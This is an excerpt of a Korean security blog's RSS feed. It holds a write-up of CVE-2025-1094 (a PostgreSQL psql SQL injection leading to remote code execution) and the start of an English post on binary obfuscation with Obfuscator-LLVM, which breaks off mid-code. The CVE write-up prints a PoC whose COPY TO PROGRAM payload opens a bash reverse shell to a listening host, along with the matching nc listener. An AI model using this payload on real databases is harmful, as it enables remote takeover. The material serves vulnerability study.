      <category domain="https://hackyboiz.github.io/tags/CVE-2025-25372/">CVE-2025-25372</category>
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-1094: PostgreSQL 14.15의 SQL 인젝션 취약점으로 인한 RCE</title>
      <link>https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/</link>
      <guid>https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/</guid>
      <pubDate>Wed, 30 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://thehackernews.com/2025/02/postgresql-vulnerabilit</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html">https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PostgreSQL 14.15</li><li>BeyondTrust Privileged Remote Access (PRA) &#xBC0F; Remote Support (RS) &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;</li><li>&#xC601;&#xD5A5;&#xBC1B;&#xB294; &#xBC84;&#xC804;: PostgreSQL 14.15 &#xBC0F; &#xD574;&#xB2F9; &#xBC84;&#xC804;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; BeyondTrust &#xC81C;&#xD488;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-1094&#xB294; PostgreSQL 14.15 &#xBC84;&#xC804;&#xC758; psql &#xC778;&#xD130;&#xB799;&#xD2F0;&#xBE0C; &#xB3C4;&#xAD6C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; SQL &#xC778;&#xC81D;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>&#xC785;&#xB825;&#xAC12;&#xC758; &#xBD80;&#xC801;&#xC808;&#xD55C; &#xAC80;&#xC99D;</strong>&#xC73C;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xBA70;, &#xD2B9;&#xD788; BeyondTrust&#xC758; Privileged Remote Access (PRA)&#xC640; Remote Support (RS) &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC640; &#xC5F0;&#xACC4;&#xB418;&#xC5B4; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE) &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>psql &#xB3C4;&#xAD6C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788;, &#xC774;&#xB97C; &#xD65C;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xBA54;&#xD0C0; &#xBA85;&#xB839;&#xC5B4;(!)&#xC640; COPY TO PROGRAM &#xAE30;&#xB2A5;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xC258; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; PostgreSQL&#xC758; <code>psql</code> &#xB3C4;&#xAD6C;&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; UTF-8 &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC801;&#xC808;&#xD788; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xC801; &#xACB0;&#xD568;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB429;&#xB2C8;&#xB2E4;. BeyondTrust&#xC758; <code>thin-scc-wrapper</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; <code>gskey</code> &#xAC12;&#xC744; echo &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; <code>dbquote</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; UTF-8&#xB85C; &#xC704;&#xC7A5;&#xD55C; &#xC545;&#xC758;&#xC801; &#xBC14;&#xC774;&#xD2B8;(<code>0xC0 0x27</code>)&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xBA74; <code>pg_escape_string()</code> &#xD568;&#xC218;&#xB85C;&#xB3C4; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; SQL &#xCFFC;&#xB9AC; &#xB0B4;&#xC5D0; &#xC8FC;&#xC785;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; psql&#xC5D0;&#xC11C; SQL &#xCFFC;&#xB9AC; &#xC2E4;&#xD589;&#xC774; &#xC911;&#xB2E8;&#xB418;&#xBA70;, &#xB4A4;&#xC774;&#xC5B4; &#xB098;&#xC624;&#xB294; &#xBA54;&#xD0C0; &#xBA85;&#xB839;&#xC5B4;(&#xC608;: <code>\!</code>)&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; SQL Injection&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, <code>echo $gskey</code> &#xB300;&#xC2E0; <code>echo &quot;$gskey&quot;</code>&#xC640; &#xAC19;&#xC774; &#xC778;&#xC790;&#xB97C; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC778;&#xC790; &#xC778;&#xC81D;&#xC158;&#xC744; &#xD5C8;&#xC6A9;&#xD55C; CVE-2024-12356 &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xACB0;&#xD569;&#xB420; &#xACBD;&#xC6B0;, WebSocket &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9; &#xBE44;&#xC778;&#xC99D; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E8;&#xB3C5;&#xC73C;&#xB85C;&#xB3C4; psql&#xC758; &#xC798;&#xBABB;&#xB41C; UTF-8 &#xCC98;&#xB9AC;&#xB9CC;&#xC73C;&#xB85C; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; <strong>&#xC911;&#xB300;&#xD55C; &#xC124;&#xACC4;&#xC0C1;&#xC758; &#xACB0;&#xD568;</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC; &#xC608;&#xC2DC;:</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (valid_utf8_check(input) == <span class="hljs-literal">false</span>) {    execute_sql(input);}</code></pre><p>&#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xD604;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; SQL &#xC778;&#xC81D;&#xC158;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><h3 id="1-&#xCDE8;&#xC57D;&#xD55C;-PostgreSQL-14-15-&#xD658;&#xACBD;-&#xC124;&#xC815;"><a href="#1-&#xCDE8;&#xC57D;&#xD55C;-PostgreSQL-14-15-&#xD658;&#xACBD;-&#xC124;&#xC815;" class="headerlink" title="1. &#xCDE8;&#xC57D;&#xD55C; PostgreSQL 14.15 &#xD658;&#xACBD; &#xC124;&#xC815;"></a>1. &#xCDE8;&#xC57D;&#xD55C; PostgreSQL 14.15 &#xD658;&#xACBD; &#xC124;&#xC815;</h3><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] PostgreSQL 14.15 &#xB3C4;&#xCEE4; &#xC774;&#xBBF8;&#xC9C0; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xC911;...&quot;</span>sudo docker pull postgres:14.15<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] PostgreSQL 14.15 &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xBC30;&#xD3EC; &#xC911;...&quot;</span>sudo docker run --name vulnerable_postgres \-e POSTGRES_USER=postgres \-e POSTGRES_PASSWORD=postgres \-e POSTGRES_DB=testdb \-p 5432:5432 \-d postgres:14.15<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] PostgreSQL &#xCD08;&#xAE30;&#xD654; &#xB300;&#xAE30; &#xC911;...&quot;</span>sleep 10<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] &#xCDE8;&#xC57D;&#xD55C; &#xD14C;&#xC774;&#xBE14; &#xC0DD;&#xC131; &#xC911;...&quot;</span>sudo docker <span class="hljs-built_in">exec</span> -i vulnerable_postgres psql -U postgres -d testdb &lt;&lt;EOFCREATE TABLE users (id SERIAL PRIMARY KEY, username TEXT, password TEXT);INSERT INTO users (username, password) VALUES (<span class="hljs-string">&apos;admin&apos;</span>, <span class="hljs-string">&apos;password123&apos;</span>);EOF<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[&#x2713;] &#xC124;&#xC815; &#xC644;&#xB8CC;. &#xCDE8;&#xC57D;&#xD55C; PostgreSQL 14.15&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC785;&#xB2C8;&#xB2E4;!&quot;</span></code></pre><p>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; <code>setup.sh</code>&#xB85C; &#xC800;&#xC7A5;&#xD55C; &#xD6C4; &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">chmod +x setup.shsudo ./setup.sh</code></pre><h3 id="2-Exploit"><a href="#2-Exploit" class="headerlink" title="2. Exploit"></a>2. Exploit</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> psycopg2<span class="hljs-comment"># PostgreSQL &#xC5F0;&#xACB0; &#xC815;&#xBCF4;</span>HOST = <span class="hljs-string">&quot;127.0.0.1&quot;</span>PORT = <span class="hljs-string">&quot;5432&quot;</span>DATABASE = <span class="hljs-string">&quot;testdb&quot;</span>USER = <span class="hljs-string">&quot;postgres&quot;</span>PASSWORD = <span class="hljs-string">&quot;postgres&quot;</span><span class="hljs-comment"># RCE&#xB97C; &#xC704;&#xD55C; &#xC545;&#xC758;&#xC801;&#xC778; SQL &#xC778;&#xC81D;&#xC158; &#xD398;&#xC774;&#xB85C;&#xB4DC;</span>payload = <span class="hljs-string">&quot;COPY users TO PROGRAM &apos;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/192.168.232.155/4444 0&gt;&amp;1\&quot;&apos;;&quot;</span><span class="hljs-keyword">try</span>:    conn = psycopg2.connect(host=HOST, port=PORT, dbname=DATABASE, user=USER, password=PASSWORD)    cursor = conn.cursor()    print(<span class="hljs-string">&quot;[+] PostgreSQL&#xC5D0; &#xC5F0;&#xACB0;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!&quot;</span>)    cursor.execute(payload)    print(<span class="hljs-string">&quot;[&#x2713;] RCE &#xC2E4;&#xD589; &#xC644;&#xB8CC;! Netcat &#xB9AC;&#xC2A4;&#xB108;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC138;&#xC694;.&quot;</span>)<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    print(<span class="hljs-string">&quot;[-] &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2E4;&#xD328;:&quot;</span>, str(e))<span class="hljs-keyword">finally</span>:    <span class="hljs-keyword">if</span> conn:        cursor.close()        conn.close()</code></pre><p>Netcat &#xB9AC;&#xC2A4;&#xB108;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC258; &#xC5F0;&#xACB0;&#xC744; &#xC218;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">nc -lvnp 4444</code></pre><p>&#xC774;&#xD6C4; PoC &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC6D0;&#xACA9; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">python3 poc.py</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html">https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/PostgreSQL/">PostgreSQL</category>
      
      <category domain="https://hackyboiz.github.io/tags/BeyondTrust/">BeyondTrust</category>
      
      <category domain="https://hackyboiz.github.io/tags/SQL-Injection/">SQL Injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/Remote-Code-Execution/">Remote Code Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-1094/">CVE-2025-1094</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-12356/">CVE-2024-12356</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Anti-Debugging Part 3(EN)</title>
      <link>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/en/</link>
      <guid>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/en/</guid>
      <pubDate>Mon, 28 Apr 2025 13:15:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is OUYA77! &amp;#x1F642;&lt;/p&gt;
&lt;p&gt;Last time, I mentioned that I might cover obfuscation on the blog if the opportunity came up &amp;#x2</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is OUYA77! &#x1F642;</p><p>Last time, I mentioned that I might cover obfuscation on the blog if the opportunity came up &#x2014; and well, here we are with Part 3!</p><p>In Part 1, we explored debugging and anti-debugging techniques. Then in Part 2, we looked at ways to <strong>bypass anti-debugging</strong>, which acts like a &#x201C;trap card&#x201D; trying to block certain actions.</p><p>(If you haven&#x2019;t checked them out yet, here&#x2019;s a quick link &#x1F447; haha </p><blockquote><p>Check out the previous parts:</p><p><a href="https://hackyboiz.github.io/2024/12/29/OUYA77/Anti_part1/en/">[Research] Anti-Debugging Part 1 (EN)</a></p><p><a href="https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/en/">[Research] Anti-Debugging Part 2 (EN)</a></p></blockquote><p>Since this series has been a bit of long journey, it&#x2019;s totally understandable if some details have slipped your mind.</p><p>Just in case, I even prepared a little cartoon (!) to sum things up. <del>I swear there was no my hope while making it. It&#x2019;s also a <em>total secret</em> that I had to call in an expert for help with the framing because it turned out way harder than I thought&#x2026;</del></p><h2 id="Anti-Debugging-Part-Summary"><a href="#Anti-Debugging-Part-Summary" class="headerlink" title="Anti-Debugging Part Summary"></a>Anti-Debugging Part Summary</h2><p><img src="image%201.png" alt="image.png"></p><p><img src="image%202.png" alt="image.png"></p><p><img src="image%203.png" alt="image.png"></p><p>As you saw in the cartoon, anti-debugging techniques were developed to block debugging &#x2014; and bypassing techniques were invented to counter them. Through Part 1 and Part 2, we saw that anti-debugging has its limits: ultimately, a program must be loaded into memory to run, and the final binary must be delivered to the user. This means that if a user analyzes the binary and understands the anti-debugging logic, they can patch it or find ways around it.</p><p>That&#x2019;s when the legendary Chef Gordon Ramsay shows up and yells,</p><p><strong>&#x201C;You need to <em>hide</em> these ingredients (anti-debugging logic) better!&#x201D;</strong> &#x1F525;&#x1F468;&#x200D;&#x1F373;</p><p>&#x2014; And thus, <strong>obfuscation</strong> must be applied.</p><blockquote><p>In Part 2&#x2026;</p><p><img src="image%204.png" alt="image.png"></p><blockquote><p>???: So why not just hide it? / 000: How!!</p></blockquote></blockquote><p>When anti-debugging is combined with <strong>obfuscation</strong>, it becomes extremely difficult to identify which parts of a program contain anti-debugging logic, making the analysis process even more challenging. That&#x2019;s why in <strong>Part 3</strong>, we will take a deep dive into this fascinating technique called <strong>obfuscation</strong>!</p><h2 id="1-Obfuscation"><a href="#1-Obfuscation" class="headerlink" title="1. Obfuscation"></a>1. Obfuscation</h2><h3 id="1-1-Introduction"><a href="#1-1-Introduction" class="headerlink" title="1.1 Introduction"></a>1.1 Introduction</h3><ul><li><strong>Obfuscation</strong> is a technique that intentionally makes a program&#x2019;s code difficult to read.<br>Wikipedia defines it as:</li></ul><blockquote><p>&#x201C;In software development, obfuscation is the practice of creating source or machine code that is intentionally difficult for humans or computers to understand.&#x201D;</p></blockquote><p>Obfuscation goes beyond simply making code less readable &#x2014; it is used to <strong>hinder reverse engineering, debugging, and static analysis</strong>, and serves various purposes such as intellectual property protection, security enhancement, and evading malware analysis.</p><h3 id="1-2-Purpose"><a href="#1-2-Purpose" class="headerlink" title="1.2 Purpose"></a>1.2 Purpose</h3><p>Obfuscation achieves the following defensive goals without changing the actual behavior of a program:</p><ul><li><strong>Reduced readability</strong>: Hides the logical structure and meaning of the code to obstruct understanding.</li><li><strong>Increased structural complexity</strong>: Introduces unnecessary operations, nonlinear flows, random-based conditions, etc.</li><li><strong>Evasion of pattern detection</strong>: Tricks signature-based detection tools or causes false positives/negatives.</li></ul><p>In short, if an analyst looks at the program and thinks,</p><p><em>&#x201C;Ugh&#x2026; this is going to be a headache ;;&#x201D;</em></p><p>&#x2014; then the obfuscation has already succeeded to some degree.</p><h3 id="1-3-Types-of-Obfuscation"><a href="#1-3-Types-of-Obfuscation" class="headerlink" title="1.3 Types of Obfuscation"></a>1.3 Types of Obfuscation</h3><p>Obfuscation can largely be divided into two categories:</p><ol><li><strong>Source Code Obfuscation</strong></li></ol><ul><li><strong>Target</strong>: High-level source code (Java, JavaScript, Python, etc.)</li><li><strong>Applied at</strong>: Before compilation</li><li><strong>Purpose</strong>: To secure internal code and protect flow when partially disclosing code to outsourcing partners or clients</li></ul><p>Source code obfuscation is often used when a company needs to provide part of its code to third parties, ensuring that the overall structure or algorithms are not easily understood. Common techniques include <strong>renaming identifiers</strong>, <strong>rearranging code blocks</strong>, <strong>control flow obfuscation</strong>, and <strong>string encoding</strong>.</p><ol><li><strong>Binary Obfuscation</strong></li></ol><ul><li><strong>Target</strong>: Compiled executables (C, C++, Go, etc.)</li><li><strong>Applied at</strong>: During or after compilation</li><li><strong>Purpose</strong>: Product protection, algorithm safeguarding, crack/reverse engineering prevention</li></ul><p>Binary obfuscation is <strong>crucial for protecting actual distributed products.</strong> Since most commercial software is distributed in binary form &#x2014; containing valuable algorithms, licensing logic, and authentication mechanisms &#x2014; protecting it is essential. Otherwise, attackers or even customers could reverse engineer or crack the software.</p><blockquote><p>Technically, malware is also a kind of &#x201C;product&#x201D;&#x2026; and yes, binary obfuscation is heavily used in malware as well.</p></blockquote><p>Binary obfuscation aims to disrupt static analysis tools like IDA and Ghidra, confuse debugging attempts, and in some cases, ensure that the code is only decrypted during execution. Common techniques include <strong>control flow flattening</strong>, <strong>string encryption</strong>, <strong>inserting junk code</strong>, <strong>name mangling</strong>, and <strong>indirect jumps/calls</strong>.</p><h3 id="1-4-Focus-on-Binary-Obfuscation"><a href="#1-4-Focus-on-Binary-Obfuscation" class="headerlink" title="1.4 Focus on Binary Obfuscation"></a>1.4 Focus on Binary Obfuscation</h3><p>In this part, we will especially focus on binary obfuscation. Why is it so important? Simple: Because most of the programs we use are ultimately delivered as binaries, containing the company&#x2019;s key know-how, algorithms, licensing mechanisms, and more. Without proper protection, it can lead not just to technical attacks like cracking and reverse engineering, but also serious business damage like illegal redistribution and intellectual property theft. That&#x2019;s why we need anti-reversing techniques &#x2014; and that&#x2019;s what we have been exploring since Part 1.</p><p>If anti-debugging mainly disrupts dynamic analysis (trying to observe the program at runtime),<br>then obfuscation focuses on obstructing static analysis (analyzing the code without running it).<br>When both techniques are combined, the analyst is essentially facing a near-invincible defense system.</p><p><img src="image.png" alt="image.png"></p><blockquote><p><del>(Though, even an &#x201C;invincible shield&#x201D; can meet an &#x201C;unstoppable spear&#x201D; someday&#x2026;)</del></p></blockquote><h2 id="2-The-Three-Pillars-of-Binary-Obfuscation"><a href="#2-The-Three-Pillars-of-Binary-Obfuscation" class="headerlink" title="2. The Three Pillars of Binary Obfuscation"></a>2. The Three Pillars of Binary Obfuscation</h2><p>Binary obfuscation is generally classified into the following three categories.</p><p>(<em>Some parts will be covered briefly.</em>)</p><h3 id="2-1-Structural-Obfuscation"><a href="#2-1-Structural-Obfuscation" class="headerlink" title="2.1 Structural Obfuscation"></a>2.1 Structural Obfuscation</h3><blockquote><p>Obfuscation that twists the structure of the code&#x2019;s control flow itself, making analysis much harder.</p></blockquote><p>This category mainly targets <strong>static analysis tools</strong> that attempt to understand the program at the function or block level, making it difficult to grasp the overall structure.</p><ul><li><p><strong>Control Flow Flattening</strong></p><p>  <img src="image%205.png" alt="ref. https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/"></p><p>  ref. <a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/">https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/</a></p><ul><li>Originally, logical flows like <code>if</code>, <code>while</code>, and <code>switch</code> are flattened into a single <code>dispatcher</code> loop. The next block to execute is determined based on a <strong>state variable</strong>.<ul><li>As a result, the control flow is obfuscated into a non-intuitive form, neutralizing the control flow tree analysis of static tools.</li><li>We&#x2019;ll take a closer look at this later with an example from Obfuscator-LLVM (OLLVM)!</li></ul></li></ul></li><li><strong>Junk / Dead Code Insertion</strong><ul><li>Inserts meaningless operations (Junk Code) or never-executed code (Dead Code) into the program.</li><li>Typical examples:<ul><li>No-op operations (<code>x = x;</code>, <code>add eax, 0;</code>)</li><li>Unreachable branches (<code>if (false) { ... }</code>)</li></ul></li></ul></li><li><strong>Indirect Branching / Calling</strong><ul><li>Jumps or calls are made through calculated addresses (e.g., <code>jmp eax</code>, <code>call [ecx+0x10]</code>).</li><li>This makes tracing the code flow extremely difficult (especially for API resolution).</li></ul></li><li><strong>Opaque Predicate</strong><ul><li>Branches are inserted with conditions that are always true/false (e.g., <code>if ((x*x) &gt;= 0)</code>).</li><li>Harmless at runtime but significantly obstruct static flow analysis.</li></ul></li><li><strong>Important Note:</strong><ul><li>Compiler optimization options like <code>O2</code>, <code>O3</code> may eliminate meaningless code during build.</li><li>Therefore, it&#x2019;s critical to <strong>disable optimization options</strong> or <strong>use runtime-dependent variables</strong> to prevent removal during obfuscation.</li></ul></li><li><strong>Effect:</strong><ul><li>Analysts are forced to wade through unnecessary loops and branches, leading to psychological exhaustion. As shown below, inserting just a few dummy codes can make the control flow graph dramatically more complex.</li></ul></li></ul><p><img src="image%206.png" alt="image.png"></p><p>&#x1F50D; <em>Structural obfuscation mainly aims to neutralize CFG (Control Flow Graph) analysis and flow tracking.</em></p><h3 id="2-2-Data-Obfuscation"><a href="#2-2-Data-Obfuscation" class="headerlink" title="2.2 Data Obfuscation"></a>2.2 Data Obfuscation</h3><blockquote><p>Obfuscation that hides or alters data to make it difficult to infer its meaning.</p></blockquote><p>This category focuses on removing or hiding <strong>valuable clues</strong> such as strings, constants, and API names.</p><ul><li><strong>String Encryption</strong><ul><li>Critical strings are encrypted and only decrypted at runtime.</li><li>Static analysis won&#x2019;t reveal strings like <code>&quot;CreateProcess&quot;</code> anymore.</li></ul></li><li><strong>Constant Encoding</strong><ul><li>Constant values are represented indirectly (e.g., <code>1337</code> &#x2192; <code>1000 + 337</code>).</li><li>This complicates understanding the program&#x2019;s purpose and logic during decompilation.</li></ul></li><li><strong>API Call Obfuscation/ Import Hiding</strong><ul><li>API names are hidden using hashing or encryption, loaded dynamically via <code>LoadLibrary</code> and <code>GetProcAddress</code>.</li><li>Completely neutralizes IAT-based automatic analysis.</li></ul></li></ul><p>&#x1F50D; <em>Data obfuscation prevents analysts and tools from extracting meaningful information (identifiers, strings, APIs).</em></p><h3 id="2-3-Algorithm-Obfuscation"><a href="#2-3-Algorithm-Obfuscation" class="headerlink" title="2.3 Algorithm Obfuscation"></a>2.3 Algorithm Obfuscation</h3><blockquote><p>Obfuscation that makes the actual functionality and logic of the program harder to understand.</p></blockquote><p>This category twists the <strong>behavior itself</strong>, making it difficult to understand &#x201C;what&#x201D; the program actually does, even after disassembling it.</p><ul><li><p><strong>Name Mangling &amp; Symbol Stripping</strong></p><ul><li>Debugging symbols are removed, and function/variable names are replaced with random strings.</li><li>This makes understanding the overall logic and functionality much harder.</li><li><p>Below is an example from <em>Hack The Drone 2024 (Final)</em> where LFSR Galois algorithm was used for packet encoding.</p><p><img src="image%207.png" alt="image.png"></p></li><li><p>As shown, original function and parameter names reveal a lot about the algorithm.</p><p><img src="image%208.png" alt="image.png"></p></li><li><p>However, with name mangling applied, it becomes much harder to quickly figure out what the algorithm does.</p><ul><li><em>(Although nowadays, tools like GPT can deduce the logic pretty quickly&#x2026;)</em> &#x1F605;</li></ul></li></ul></li><li><strong>Self-Modifying Code</strong><ul><li>The program modifies its own code during execution.</li><li>This makes static analysis practically impossible.</li></ul></li><li><strong>Virtualization Obfuscation</strong><ul><li>A custom virtual ISA (instruction set architecture) is created, and the original code is transformed into bytecode.</li><li>Without reverse-engineering the VM interpreter, understanding the logic is nearly impossible.</li></ul></li></ul><p>&#x1F50D; <em>Algorithm obfuscation makes it extremely difficult to understand <strong>what the program actually does</strong>.</em></p><h2 id="3-Hands-on-with-Obfuscator-LLVM"><a href="#3-Hands-on-with-Obfuscator-LLVM" class="headerlink" title="3. Hands-on with Obfuscator-LLVM"></a>3. Hands-on with Obfuscator-LLVM</h2><p><strong>OLLVM (Obfuscator-LLVM)</strong> is an obfuscation-enhanced version of the open-source compiler framework <strong>LLVM</strong>. While LLVM was originally designed to generate &#x201C;clean&#x201D; and optimized code, researchers noticed how flexible its architecture was &#x2014; and decided to extend it by adding <strong>heavy-duty code obfuscation</strong> capabilities. That&#x2019;s how OLLVM was born.</p><p>OLLVM automatically transforms code during the <strong>compilation process</strong>, by inserting dedicated <strong>obfuscation passes</strong>. Thanks to this, developers don&#x2019;t need to manually modify their source code &#x2014; they just need to compile it differently to produce heavily obfuscated binaries.</p><h3 id="3-1-How-to-Build-Clang-for-OLLVM"><a href="#3-1-How-to-Build-Clang-for-OLLVM" class="headerlink" title="3.1 How to Build Clang for OLLVM"></a>3.1 How to Build Clang for OLLVM</h3><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Installation">https://github.com/obfuscator-llvm/obfuscator/wiki/Installation</a></p><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git$ mkdir build &amp;&amp; <span class="hljs-built_in">cd</span> build$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/$ make -j7</code></pre><p>In my case, I encountered a few errors during the build process, so I had to patch the source code manually. If you run into similar issues, check your build logs and troubleshoot accordingly.</p><p>Here are the fixes I made:</p><p><strong>In</strong> <code>obfuscator/tools/clang/lib/CodeGen/CGOpenMPRuntime.cpp</code> <strong>(lines 6275, 6321, 6400):</strong></p><p><code>error:lambda parameter &#x2018;CGF&#x2019; previously declared as a capture</code> </p><p>&#x2192; Simply remove the redundant <code>&amp;CFG</code> capture.</p><pre><code class="hljs c"><span class="hljs-keyword">auto</span> &amp;&amp;BeginThenGen = [&amp;D, &amp;CGF, Device, &amp;Info, &amp;CodeGen, &amp;NoPrivAction](...)&#x2193;<span class="hljs-keyword">auto</span> 